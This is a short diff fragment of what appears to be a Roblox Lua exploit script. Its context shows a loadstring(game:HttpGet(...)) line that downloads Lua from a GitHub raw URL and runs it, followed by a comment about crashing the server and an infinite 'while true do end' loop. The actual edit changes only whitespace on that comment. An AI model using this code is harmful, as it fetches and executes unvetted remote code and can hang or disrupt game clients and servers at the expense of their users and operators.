@@ -10,5 +10,5 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/Chiiicken5538/lua-scr
 ]]--
 
 
--- crash server ezzz jk
+-- crash server ezzz jk  
 while true do end
